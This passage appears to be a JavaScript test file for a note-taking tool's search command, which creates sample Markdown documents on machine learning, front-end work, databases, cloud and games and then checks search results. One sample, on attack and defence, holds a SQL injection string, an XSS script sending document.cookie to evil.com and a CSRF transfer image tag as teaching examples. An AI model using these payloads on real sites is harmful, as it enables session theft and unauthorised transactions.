/**
 * TG-11 搜索功能测试
 * 测试 search 命令及其别名
 * 验证：使用有语义差异的内容测试向量匹配度
 */
const { createTestContext } = require('./test-framework');

const ctx = createTestContext('TG-11 搜索功能测试');
const { runCmd, addResult, extractDocId, getDocTitle, saveReports, cleanup, createdDocs, sleep, NOTEBOOK_ID, PARENT_ID } = ctx;

function isVectorSearchNotEnabled(result) {
    return result.output.includes('向量搜索未启用') || 
           result.error?.includes('向量搜索未启用') ||
           result.output.includes('未配置');
}

function parseSearchResults(output) {
    try {
        const lastBrace = output.lastIndexOf('}');
        if (lastBrace === -1) return null;
        
        let depth = 0;
        let start = -1;
        for (let i = lastBrace; i >= 0; i--) {
            if (output[i] === '}') depth++;
            if (output[i] === '{') depth--;
            if (depth === 0) { start = i; break; }
        }
        
        if (start === -1) return null;
        
        const jsonStr = output.substring(start, lastBrace + 1);
        const data = JSON.parse(jsonStr);
        return {
            results: data.data?.results || data.results || [],
            total: data.data?.total || data.total || 0,
            matches: data.data?.matches || data.matches || [],
            success: data.success !== false
        };
    } catch (e) {
        return null;
    }
}

function getScore(result) {
    return result.relevanceScore ?? result.score ?? result.similarity ?? result.relevance ?? result.distance ?? null;
}

console.log('\n========================================');
console.log('TG-11 搜索功能测试');
console.log('========================================\n');

/**
 * 创建有语义差异的测试文档
 * 目的：验证语义搜索能区分不同主题的内容
 */
console.log('准备测试数据 - 创建语义差异文档...');

const ts = Date.now();

/**
 * 测试文档内容设计：
 * 
 * 使用复杂 Markdown 格式，包含：
 * - 多级标题 (# ## ###)
 * - 有序/无序列表
 * - 代码块
 * - 表格
 * - 引用块
 * - 行内代码
 * 
 * 目的：测试语义搜索对结构化内容的处理能力
 */
const semanticDocs = [
    {
        title: `机器学习算法与实践_${ts}`,
        content: `# 机器学习算法与实践指南

## 概述

机器学习是**人工智能**的核心分支，使计算机能够从数据中自动学习规律。

## 三大学习范式

| 范式 | 描述 | 典型任务 |
|------|------|----------|
| 监督学习 | 使用标注数据训练 | 分类、回归 |
| 无监督学习 | 从无标签数据发现模式 | 聚类、降维 |
| 强化学习 | 通过交互获得奖励优化策略 | 游戏AI、机器人 |

## 经典算法详解

### 1. 线性回归
\`\`\`python
from sklearn.linear_model import LinearRegression
model = LinearRegression()
model.fit(X_train, y_train)
predictions = model.predict(X_test)
\`\`\`

### 2. 支持向量机 (SVM)
- 在高维空间寻找最优分类超平面
- 核函数：RBF、Polynomial、Sigmoid
- 参数调优：C（正则化）、gamma（核系数）

### 3. 集成学习方法
> 随机森林和梯度提升树GBDT通过集成多个弱学习器提升性能

- **Random Forest**: Bagging + 决策树
- **XGBoost**: Gradient Boosting 优化实现
- **LightGBM**: 直方图加速，适合大数据

## 模型评估指标

\`\`\`
分类任务: 准确率、精确率、召回率、F1-Score、ROC-AUC
回归任务: MSE、MAE、R²
\`\`\`

## 应用场景
1. 推荐系统 - 个性化内容推荐
2. 欺诈检测 - 异常交易识别
3. 医疗诊断 - 疾病预测辅助
4. 金融风控 - 信用评分模型`
    },
    {
        title: `现代前端开发技术栈_${ts}`,
        content: `# 现代前端开发技术栈

## 核心技术三件套

| 技术 | 职责 | 版本 |
|------|------|------|
| HTML5 | 结构与语义 | 5.3 |
| CSS3 | 样式与布局 | 3.0 |
| ES6+ | 交互逻辑 | 2024 |

## 主流框架对比

### React (by Meta)
\`\`\`jsx
function App() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;
}
\`\`\`

特点：
- 虚拟DOM与单向数据流
- JSX语法编写组件
- Hooks函数式编程

### Vue.js
\`\`\`vue
<template>
  <button @click="count++">{{ count }}</button>
</template>
<script setup>
import { ref } from 'vue';
const count = ref(0);
</script>
\`\`\`

### Angular (by Google)
> 全功能框架，内置依赖注入和TypeScript支持

## 构建工具链

\`\`\`bash
# Vite 创建项目
npm create vite@latest my-app -- --template react-ts

# Webpack 配置
webpack.config.js → entry/output/loaders/plugins
\`\`\`

## 状态管理方案

| 方案 | 特点 | 适用场景 |
|------|------|----------|
| Redux | 单一Store，纯函数Reducer | 大型应用 |
| MobX | 响应式，自动追踪依赖 | 中型应用 |
| Zustand | 轻量，API简洁 | 小型应用 |

## 性能优化策略

1. **代码分割** - 动态import()懒加载
2. **图片优化** - WebP格式，懒加载
3. **CDN分发** - 静态资源边缘缓存
4. **SSR/SSG** - 服务端渲染/静态生成`
    },
    {
        title: `数据库系统设计与优化_${ts}`,
        content: `# 数据库系统设计与优化

## 数据库分类

### 关系型数据库 (RDBMS)

| 产品 | 特点 | 适用场景 |
|------|------|----------|
| MySQL | 开源，生态丰富 | Web应用 |
| PostgreSQL | 功能强大，扩展性好 | 复杂查询 |
| Oracle | 企业级，高可用 | 金融系统 |

**ACID特性**：
- A - 原子性 (Atomicity)
- C - 一致性 (Consistency)
- I - 隔离性 (Isolation)
- D - 持久性 (Durability)

### NoSQL数据库

\`\`\`javascript
// MongoDB 文档操作
db.users.insertOne({
  name: "张三",
  age: 25,
  tags: ["developer", "nodejs"]
})
\`\`\`

| 类型 | 代表 | 数据模型 |
|------|------|----------|
| 文档型 | MongoDB | JSON文档 |
| 键值型 | Redis | Key-Value |
| 列族型 | Cassandra | 宽列 |
| 搜索引擎 | Elasticsearch | 倒排索引 |

## 索引优化

\`\`\`sql
-- 创建复合索引
CREATE INDEX idx_user_status_time ON orders(user_id, status, created_at);

-- 查看执行计划
EXPLAIN SELECT * FROM orders WHERE user_id = 100;
\`\`\`

> 索引设计原则：选择性高的列优先，避免过度索引

## 分布式事务方案

1. **2PC** - 两阶段提交
2. **TCC** - Try-Confirm-Cancel
3. **Saga** - 长事务编排
4. **本地消息表** - 最终一致性

## 分库分表策略

\`\`\`
水平分片: user_0, user_1, user_2 ... (按ID取模)
垂直分片: 订单库、用户库、商品库 (按业务拆分)
\`\`\``
    },
    {
        title: `云计算与分布式系统架构_${ts}`,
        content: `# 云计算与分布式系统架构

## 云服务模型

\`\`\`
┌─────────────────────────────────┐
│           SaaS (软件即服务)        │
├─────────────────────────────────┤
│           PaaS (平台即服务)        │
├─────────────────────────────────┤
│           IaaS (基础设施即服务)     │
└─────────────────────────────────┘
\`\`\`

| 服务商 | IaaS | PaaS | 特色服务 |
|--------|------|------|----------|
| AWS | EC2 | Elastic Beanstalk | Lambda |
| Azure | VM | App Service | AKS |
| 阿里云 | ECS | EDAS | 函数计算 |

## Docker容器化

\`\`\`dockerfile
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
\`\`\`

\`\`\`bash
# 构建与运行
docker build -t myapp:v1 .
docker run -d -p 3000:3000 myapp:v1
\`\`\`

## Kubernetes核心概念

| 资源 | 作用 | 示例 |
|------|------|------|
| Pod | 最小部署单元 | nginx容器组 |
| Service | 服务发现与负载均衡 | ClusterIP |
| Deployment | 声明式部署 | 滚动更新 |
| ConfigMap | 配置管理 | 环境变量注入 |
| Ingress | HTTP路由 | 域名到服务映射 |

\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx
  template:
    spec:
      containers:
      - name: nginx
        image: nginx:1.21
        ports:
        - containerPort: 80
\`\`\`

## 微服务架构

> 服务间通信：REST API / gRPC / 消息队列

**服务治理要点**：
- 服务发现 (Consul/Nacos)
- 负载均衡 (Ribbon/LoadBalancer)
- 熔断降级 (Sentinel/Hystrix)
- 链路追踪 (Jaeger/Zipkin)`
    },
    {
        title: `网络安全攻防技术_${ts}`,
        content: `# 网络安全攻防技术

## 常见攻击类型

### 1. SQL注入
\`\`\`sql
-- 恶意输入
' OR '1'='1' --

-- 生成的危险SQL
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'xxx'
\`\`\`

### 2. XSS跨站脚本
\`\`\`html
<!-- 反射型XSS -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
\`\`\`

### 3. CSRF跨站请求伪造
\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
\`\`\`

### 4. DDoS攻击

| 类型 | 原理 | 防护 |
|------|------|------|
| SYN Flood | TCP握手耗尽 | SYN Cookie |
| HTTP Flood | 请求泛滥 | 速率限制 |
| DNS放大 | 反射攻击 | 流量清洗 |

## 防御技术体系

### 身份认证
\`\`\`javascript
// JWT Token验证
const token = jwt.sign({ userId: 123 }, SECRET_KEY, { expiresIn: '1h' });
const decoded = jwt.verify(token, SECRET_KEY);
\`\`\`

### 加密方案

| 类型 | 算法 | 用途 |
|------|------|------|
| 对称加密 | AES-256-GCM | 数据加密 |
| 非对称加密 | RSA-2048 | 密钥交换 |
| 哈希 | SHA-256 | 完整性校验 |

### WAF规则示例
\`\`\`
SecRule REQUEST_URI "@contains ../" \\
    "id:1001,phase:1,deny,status:403,msg:'Path Traversal Attack'"
\`\`\`

## 安全合规框架

> - **ISO 27001** - 信息安全管理体系
> - **SOC 2** - 服务组织控制报告
> - **GDPR** - 欧盟数据保护条例
> - **等级保护** - 中国网络安全分级`
    },
    {
        title: `深度学习与神经网络架构_${ts}`,
        content: `# 深度学习与神经网络架构

## 神经网络基础

\`\`\`
输入层 → [隐藏层1] → [隐藏层2] → ... → 输出层
          ↓            ↓
       ReLU         ReLU
\`\`\`

### 激活函数

| 函数 | 公式 | 特点 |
|------|------|------|
| ReLU | max(0, x) | 计算快，解决梯度消失 |
| Sigmoid | 1/(1+e^-x) | 输出0-1，二分类 |
| GELU | x·Φ(x) | Transformer首选 |

## 反向传播算法

\`\`\`python
import torch
import torch.nn as nn

class SimpleNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc1 = nn.Linear(784, 256)
        self.fc2 = nn.Linear(256, 10)
    
    def forward(self, x):
        x = torch.relu(self.fc1(x))
        return self.fc2(x)

# 训练循环
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
loss_fn = nn.CrossEntropyLoss()
\`\`\`

## CNN卷积神经网络

\`\`\`
输入图像 → [Conv] → [Pool] → [Conv] → [Pool] → [FC] → 输出
            3x3       2x2      3x3       2x2
\`\`\`

**经典架构**：LeNet → AlexNet → VGG → ResNet → EfficientNet

## Transformer架构

> 基于自注意力机制，摆脱循环结构限制

\`\`\`
Input Embedding
      ↓
Positional Encoding
      ↓
┌─────────────────────┐
│ Multi-Head Attention │ ← Self-Attention
├─────────────────────┤
│   Feed Forward       │
└─────────────────────┘
      ↓ (×N layers)
   Output
\`\`\`

**代表模型**：BERT、GPT系列、T5、LLaMA

## 生成模型

| 模型 | 原理 | 应用 |
|------|------|------|
| GAN | 生成器vs判别器 | 图像生成 |
| VAE | 变分推断 | 数据增强 |
| Diffusion | 去噪过程 | 高质量图像 |`
    },
    {
        title: `AI安全与对抗机器学习_${ts}`,
        category: 'cross',
        content: `# AI安全与对抗机器学习

## 对抗样本攻击

### 攻击原理
\`\`\`
原始图像 x + 微小扰动 ε = 对抗样本 x'
              ↓
模型预测: "熊猫" → "长臂猿" (高置信度)
\`\`\`

### 攻击方法

| 方法 | 类型 | 公式 |
|------|------|------|
| FGSM | 白盒 | x' = x + ε·sign(∇x L) |
| PGD | 白盒 | 迭代FGSM |
| C&W | 白盒 | 优化攻击 |
| 黑盒攻击 | 迁移 | 替代模型 |

\`\`\`python
# FGSM攻击示例
def fgsm_attack(image, epsilon, gradient):
    sign_gradient = gradient.sign()
    perturbed_image = image + epsilon * sign_gradient
    return torch.clamp(perturbed_image, 0, 1)
\`\`\`

## 模型安全威胁

### 1. 模型窃取攻击
\`\`\`
查询API → 收集输入输出对 → 训练替代模型 → 逼近原模型
\`\`\`

### 2. 数据投毒攻击
\`\`\`python
# 在训练数据中注入后门样本
poisoned_data = normal_data + backdoor_samples
model.train(poisoned_data)  # 模型学习到后门触发器
\`\`\`

### 3. 后门攻击
> 触发器 + 正常输入 → 攻击者指定的错误输出

## 防御技术

| 防御方法 | 原理 | 效果 |
|----------|------|------|
| 对抗训练 | 加入对抗样本训练 | 提高鲁棒性 |
| 输入预处理 | 去除对抗扰动 | 部分有效 |
| 差分隐私 | 噪声保护数据 | 保护隐私 |

## 联邦学习

\`\`\`
┌─────────┐   ┌─────────┐   ┌─────────┐
│ Client1 │   │ Client2 │   │ Client3 │
└────┬────┘   └────┬────┘   └────┬────┘
     │             │             │
     ↓             ↓             ↓
┌─────────────────────────────────────┐
│        聚合服务器 (FedAvg)            │
│   w_new = Σ(n_k/n) × w_k            │
└─────────────────────────────────────┘
\`\`\`

> 仅共享梯度，不共享原始数据，保护隐私

## 可解释AI

\`\`\`python
# SHAP值解释
import shap
explainer = shap.TreeExplainer(model)
shap_values = explainer.shap_values(X_test)
shap.summary_plot(shap_values, X_test)
\`\`\``
    },
    {
        title: `云原生数据库与分布式存储_${ts}`,
        category: 'cross',
        content: `# 云原生数据库与分布式存储

## 架构特点

\`\`\`
┌─────────────────────────────────────────┐
│            计算层 (无状态)                │
│   [Node1] [Node2] [Node3] ...          │
│         ↕ 水平扩展 ↕                    │
├─────────────────────────────────────────┤
│            存储层 (分布式)                │
│   [Shard1] [Shard2] [Shard3] ...       │
└─────────────────────────────────────────┘
\`\`\`

> **存算分离**：计算层无状态可弹性扩展，存储层共享分布式存储

## 主流产品对比

| 产品 | 兼容协议 | 特色 | 厂商 |
|------|----------|------|------|
| Aurora | MySQL/PG | 存储计算分离 | AWS |
| Cloud Spanner | SQL | 全球一致性 | Google |
| PolarDB | MySQL/PG | 共享存储 | 阿里云 |
| TiDB | MySQL | HTAP混合 | PingCAP |
| CockroachDB | PostgreSQL | 强一致性 | Cockroach Labs |

## 分布式事务

### Google Spanner TrueTime
\`\`\`
TrueTime API: tt = [earliest, latest]
保证: |now - tt.earliest| < ε and |now - tt.latest| < ε
\`\`\`

### TiDB事务模型
\`\`\`go
// Percolator模型
1. Prewrite: 写入锁 + 数据
2. Commit: 获取时间戳 + 释放锁
3. 异步清理锁
\`\`\`

## Raft一致性协议

\`\`\`
Leader选举: Candidate → RequestVote → Leader
日志复制:   Leader → AppendEntries → Followers
           ↓
    多数确认后提交
\`\`\`

## 一致性模型

| 模型 | 保证 | 性能 |
|------|------|------|
| 线性一致性 | 全局顺序 | 最低 |
| 顺序一致性 | 单进程顺序 | 中等 |
| 最终一致性 | 最终收敛 | 最高 |

## 对象存储

\`\`\`bash
# S3操作示例
aws s3 cp local_file.txt s3://my-bucket/
aws s3 ls s3://my-bucket/
aws s3 rm s3://my-bucket/old_file.txt
\`\`\`

| 产品 | 特点 | 用途 |
|------|------|------|
| S3 | 11个9持久性 | 数据归档 |
| OSS | 多地域部署 | 大数据存储 |
| MinIO | 兼容S3 API | 私有部署 |`
    },
    {
        title: `游戏引擎与图形渲染技术_${ts}`,
        category: 'similar',
        content: `# 游戏引擎与图形渲染技术

## 主流游戏引擎

| 引擎 | 语言 | 渲染特点 | 授权 |
|------|------|----------|------|
| Unity | C# | 跨平台，Asset Store丰富 | 订阅制 |
| Unreal | C++ | 高质量渲染，Blueprint | 免费+分成 |
| Godot | GDScript | 轻量，开源免费 | MIT |

## 渲染管线

\`\`\`
顶点数据 → [顶点着色器] → [曲面细分] → [几何着色器]
              ↓
         [光栅化]
              ↓
         [片元着色器] → [后处理] → 最终图像
\`\`\`

### 渲染阶段详解

| 阶段 | 输入 | 输出 | 操作 |
|------|------|------|------|
| 顶点处理 | 顶点属性 | 裁剪空间坐标 | MVP变换 |
| 光栅化 | 三角形 | 片元 | 插值 |
| 片元处理 | 片元 | 颜色 | 纹理采样+光照 |

## 实时光照技术

### 前向渲染 vs 延迟渲染
\`\`\`
前向渲染: 几何 → 光照计算(每个光源) → 输出
延迟渲染: 几何 → G-Buffer → 光照计算(屏幕空间) → 输出
\`\`\`

| 对比 | 前向渲染 | 延迟渲染 |
|------|----------|----------|
| 光源数量 | 少量高效 | 大量高效 |
| 显存占用 | 低 | 高(G-Buffer) |
| 透明物体 | 支持 | 需额外处理 |

## 阴影技术

\`\`\`glsl
// Shadow Mapping
float shadow = 0.0;
vec4 fragPosLightSpace = lightSpaceMatrix * fragPosWorld;
float closestDepth = texture(shadowMap, projCoords.xy).r;
float currentDepth = projCoords.z;
shadow = currentDepth > closestDepth ? 1.0 : 0.0;
\`\`\`

- **Shadow Mapping**: 深度纹理比较
- **PCF**: 百分比邻近过滤，软阴影
- **Cascaded Shadow**: 级联阴影，大场景

## 后处理效果

\`\`\`hlsl
// Bloom效果
float3 bloom = 0;
for(int i = 0; i < 5; i++) {
    bloom += texture(blurTex, uv + offsets[i]).rgb * weights[i];
}
finalColor += bloom * bloomIntensity;
\`\`\`

| 效果 | 用途 |
|------|------|
| Bloom | 发光效果 |
| Tone Mapping | HDR→LDR |
| DOF | 景深模糊 |
| Motion Blur | 运动模糊 |`
    },
    {
        title: `游戏服务器与实时网络同步_${ts}`,
        category: 'similar',
        content: `# 游戏服务器与实时网络同步

## 服务器架构模式

\`\`\`
┌─────────────────────────────────────────┐
│            专用服务器模式                 │
│   [数据中心] → 高性能服务器集群           │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│            侦听服务器模式                 │
│   [玩家A] → 兼任服务器 → [玩家B,C,D...]  │
└─────────────────────────────────────────┘
\`\`\`

| 模式 | 优点 | 缺点 |
|------|------|------|
| 专用服务器 | 稳定，公平 | 成本高 |
| 侦听服务器 | 低成本 | 性能受限 |
| P2P | 无服务器成本 | 作弊难防 |

## 网络同步算法

### 状态同步
\`\`\`csharp
// 服务器每帧广播实体状态
void OnServerUpdate() {
    foreach(var entity in entities) {
        Broadcast(new StatePacket {
            entityId = entity.id,
            position = entity.position,
            velocity = entity.velocity,
            timestamp = NetworkTime
        });
    }
}
\`\`\`

### 帧同步 (Lockstep)
\`\`\`
客户端A ─┐
客户端B ─┼─→ 输入队列 ─→ 等待所有输入 ─→ 同步执行
客户端C ─┘
\`\`\`

| 对比 | 状态同步 | 帧同步 |
|------|----------|--------|
| 带宽 | 高 | 低 |
| 一致性 | 服务器保证 | 浮点数问题 |
| 回放 | 难 | 容易 |

## 延迟补偿技术

\`\`\`csharp
// 客户端预测
void OnInput(Vector2 input) {
    // 立即预测显示
    predictedPosition += input * speed * deltaTime;
    
    // 发送到服务器
    SendToServer(new InputPacket {
        input = input,
        sequence = inputSequence++
    });
}

// 服务器回溯判定
void OnHitDetection(int targetId, float timestamp) {
    // 回溯到攻击时刻的世界状态
    var historicState = GetHistoricalState(timestamp);
    if(historicState.IsHit(attacker, targetId)) {
        ApplyDamage(targetId);
    }
}
\`\`\`

### 插值平滑
\`\`\`
其他玩家位置 = Lerp(
    lastReceivedPosition,
    currentReceivedPosition,
    interpolationFactor
)
\`\`\`

## 游戏数据库设计

\`\`\`sql
-- 玩家核心数据
CREATE TABLE players (
    id BIGINT PRIMARY KEY,
    name VARCHAR(32),
    level INT,
    experience BIGINT,
    last_login TIMESTAMP
);

-- Redis缓存热点数据
SET player:1001:online 1 EX 300
ZADD leaderboard 9999 "player_1001"
\`\`\`

## 反作弊系统

| 检测方式 | 原理 | 效果 |
|----------|------|------|
| 规则检测 | 数值范围校验 | 基础防护 |
| 行为分析 | ML识别异常模式 | 中等 |
| 代码混淆 | 保护客户端逻辑 | 增加逆向成本 |`
    }
];

const docIds = [];
const docTitles = [];
const fs = require('fs');
const path = require('path');
const tempDir = path.join(__dirname, 'temp_md_files');

if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

for (let i = 0; i < semanticDocs.length; i++) {
    const doc = semanticDocs[i];
    const tempFile = path.join(tempDir, `doc_${i}_${ts}.md`);
    fs.writeFileSync(tempFile, doc.content, 'utf8');
    
    const createResult = runCmd(`create "${doc.title}" --file "${tempFile}" --parent-id ${PARENT_ID}`);
    const docId = extractDocId(createResult.output);
    if (docId) {
        createdDocs.push({ id: docId, title: doc.title });
        docIds.push(docId);
        docTitles.push(doc.title);
        console.log(`创建文档 ${i + 1}: ${doc.title}`);
    }
    
    try { fs.unlinkSync(tempFile); } catch (e) {}
    sleep(200);
}

try { fs.rmdirSync(tempDir); } catch (e) {}

console.log(`\n创建了 ${docIds.length} 个语义测试文档`);
console.log('索引测试文档...');
runCmd(`index --notebook ${NOTEBOOK_ID}`);
sleep(1000);
console.log('');

console.log('测试用例:');

// TG-11-01: Legacy 模式搜索 - 基础功能
{
    const cmd = `search "机器学习" --mode legacy --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-01', 'Legacy 模式搜索', cmd, '返回搜索结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-01', 'Legacy 模式搜索', cmd, '返回搜索结果',
                '无法解析结果', false);
        } else {
            const hasResults = searchResult.results.length > 0;
            const hasValidStructure = searchResult.results.every(r => r.id && r.content);
            addResult('TG-11-01', 'Legacy 模式搜索', cmd, '返回搜索结果',
                hasResults && hasValidStructure ? '成功' : '失败', hasResults && hasValidStructure, 
                `结果数: ${searchResult.results.length}`);
        }
    }
}

// TG-11-02: 语义搜索 - 查找AI相关内容（应该匹配机器学习和神经网络文档）
{
    const query = '人工智能和深度学习技术';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 10`;
    const result = runCmd(cmd);
    
    // 检查是否是向量搜索未启用的错误
    const vectorNotEnabled = result.output.includes('向量搜索未启用') || result.error?.includes('向量搜索未启用');
    
    if (vectorNotEnabled) {
        addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
            '跳过', true, '向量搜索未启用，跳过测试');
    } else if (!result.success) {
        addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
                '无法解析结果', false);
        } else {
            const hasResults = searchResult.results.length > 0;
            const hasScores = searchResult.results.some(r => getScore(r) !== null);
            
            // 验证是否返回了AI相关文档（机器学习或神经网络）
            const aiKeywords = ['机器学习', '神经网络', '深度学习', '算法', '模型'];
            const foundAIRelated = searchResult.results.some(r => 
                aiKeywords.some(kw => (r.content || '').includes(kw) || (r.title || '').includes(kw))
            );
            
            if (hasResults && hasScores && foundAIRelated) {
                const scores = searchResult.results.map(r => getScore(r)).filter(s => s !== null);
                const maxScore = Math.max(...scores);
                addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
                    '成功', true, `结果数: ${searchResult.results.length}, 最高分: ${maxScore?.toFixed(3)}`);
            } else if (hasResults) {
                addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
                    '部分成功', true, `有结果但未找到AI相关内容`);
            } else {
                addResult('TG-11-02', '语义搜索-AI主题', cmd, '返回AI相关结果',
                    '无结果', false, '语义搜索无结果');
            }
        }
    }
}

// TG-11-03: 语义搜索 - 查找前端开发内容（应该只匹配前端文档）
{
    const query = '网页开发和用户界面设计';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 10`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-03', '语义搜索-前端主题', cmd, '返回前端相关结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-03', '语义搜索-前端主题', cmd, '返回前端相关结果',
                '无法解析结果', false);
        } else {
            const frontendKeywords = ['HTML', 'CSS', 'JavaScript', 'React', 'Vue', '前端', '组件'];
            const foundFrontend = searchResult.results.some(r => 
                frontendKeywords.some(kw => (r.content || '').includes(kw) || (r.title || '').includes(kw))
            );
            
            if (foundFrontend) {
                addResult('TG-11-03', '语义搜索-前端主题', cmd, '返回前端相关结果',
                    '成功', true, `找到前端相关内容, 结果数: ${searchResult.results.length}`);
            } else if (searchResult.results.length > 0) {
                addResult('TG-11-03', '语义搜索-前端主题', cmd, '返回前端相关结果',
                    '部分成功', true, `有结果但相关性待验证`);
            } else {
                addResult('TG-11-03', '语义搜索-前端主题', cmd, '返回前端相关结果',
                    '无结果', false);
            }
        }
    }
}

// TG-11-04: 语义搜索 - 验证相关性排序
{
    const query = '数据库查询优化';
    const cmd = `search "${query}" --mode semantic --notebook ${NOTEBOOK_ID} --limit 10 --sort-by relevance`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-04', '语义搜索-相关性排序', cmd, '按相关性排序',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult || searchResult.results.length < 2) {
            addResult('TG-11-04', '语义搜索-相关性排序', cmd, '按相关性排序',
                '结果不足', false, '需要至少2个结果验证排序');
        } else {
            const scores = searchResult.results.map(r => getScore(r)).filter(s => s !== null);
            
            // 验证分数是否按降序排列（相关性高的在前）
            let isSorted = true;
            for (let i = 1; i < scores.length; i++) {
                if (scores[i] > scores[i - 1]) {
                    isSorted = false;
                    break;
                }
            }
            
            // 验证数据库相关内容排在前面
            const dbKeywords = ['数据库', 'MySQL', 'SQL', '查询', '索引'];
            const topResult = searchResult.results[0];
            const topIsDbRelated = dbKeywords.some(kw => 
                (topResult?.content || '').includes(kw) || (topResult?.title || '').includes(kw)
            );
            
            if (isSorted && topIsDbRelated) {
                addResult('TG-11-04', '语义搜索-相关性排序', cmd, '按相关性排序',
                    '成功', true, `分数降序: ${isSorted}, 首条相关: ${topIsDbRelated}`);
            } else {
                addResult('TG-11-04', '语义搜索-相关性排序', cmd, '按相关性排序',
                    '部分验证', true, `排序正确: ${isSorted}, 首条相关: ${topIsDbRelated}`);
            }
        }
    }
}

// TG-11-05: 语义搜索 - 低相似度阈值
{
    const query = '机器学习算法训练模型评估指标';
    const cmd = `search "${query}" --mode semantic --threshold 0.3 --notebook ${NOTEBOOK_ID} --limit 10`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-05', '低阈值(0.3)过滤', cmd, '返回较多结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-05', '低阈值(0.3)过滤', cmd, '返回较多结果',
                '无法解析', false);
        } else {
            const lowThresholdCount = searchResult.results.length;
            const scores = searchResult.results.map(r => getScore(r)).filter(s => s !== null);
            const maxScore = scores.length > 0 ? Math.max(...scores).toFixed(3) : 'N/A';
            addResult('TG-11-05', '低阈值(0.3)过滤', cmd, '返回较多结果',
                '成功', true, `低阈值结果数: ${lowThresholdCount}, 最高分: ${maxScore}`);
        }
    }
}

// TG-11-06: 语义搜索 - 高相似度阈值
{
    const query = '机器学习监督学习无监督学习强化学习算法';
    const cmd = `search "${query}" --mode semantic --threshold 0.4 --notebook ${NOTEBOOK_ID} --limit 10`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-06', '高阈值(0.4)过滤', cmd, '返回高相关结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-06', '高阈值(0.4)过滤', cmd, '返回高相关结果',
                '无法解析', false);
        } else {
            const highThresholdCount = searchResult.results.length;
            
            const scores = searchResult.results.map(r => getScore(r)).filter(s => s !== null);
            const allAboveThreshold = scores.length === 0 || scores.every(s => s >= 0.4);
            const maxScore = scores.length > 0 ? Math.max(...scores).toFixed(3) : 'N/A';
            
            addResult('TG-11-06', '高阈值(0.4)过滤', cmd, '返回高相关结果',
                allAboveThreshold && highThresholdCount > 0 ? '成功' : '部分成功', 
                allAboveThreshold && highThresholdCount > 0, 
                `高阈值结果数: ${highThresholdCount}, 最高分: ${maxScore}, 全部达标: ${allAboveThreshold}`);
        }
    }
}

// TG-11-07: 混合搜索模式
{
    const query = 'Docker容器';
    const cmd = `search "${query}" --mode hybrid --notebook ${NOTEBOOK_ID} --limit 10`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-07', '混合搜索模式', cmd, '返回搜索结果',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-07', '混合搜索模式', cmd, '返回搜索结果',
                '无法解析', false);
        } else {
            const cloudKeywords = ['Docker', '容器', 'Kubernetes', '云', '微服务'];
            const foundCloud = searchResult.results.some(r => 
                cloudKeywords.some(kw => (r.content || '').includes(kw) || (r.title || '').includes(kw))
            );
            
            addResult('TG-11-07', '混合搜索模式', cmd, '返回搜索结果',
                foundCloud ? '成功' : '部分成功', true, 
                `结果数: ${searchResult.results.length}, 找到云相关: ${foundCloud}`);
        }
    }
}

// TG-11-08: 关键词搜索模式
{
    const cmd = `search "SQL注入" --mode keyword --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-08', '关键词搜索模式', cmd, '精确匹配关键词',
            '命令执行失败', false, result.error);
    } else {
        const searchResult = parseSearchResults(result.output);
        if (!searchResult) {
            addResult('TG-11-08', '关键词搜索模式', cmd, '精确匹配关键词',
                '无法解析', false);
        } else {
            const hasExactMatch = searchResult.results.some(r => 
                (r.content || '').includes('SQL注入') || (r.content || '').includes('SQL') && (r.content || '').includes('注入')
            );
            addResult('TG-11-08', '关键词搜索模式', cmd, '精确匹配关键词',
                hasExactMatch ? '成功' : '部分成功', true, 
                `结果数: ${searchResult.results.length}, 精确匹配: ${hasExactMatch}`);
        }
    }
}

// TG-11-09: 类型过滤 - 文档块
{
    const cmd = `search "算法" --type d --notebook ${NOTEBOOK_ID}`;
    const result = runCmd(cmd);
    
    if (!result.success) {
        addResult('TG-11-09', '类型过滤 - 文档块', cmd, '返回文档块类型',
            '命令执行失败', false, result.error);
    } else {
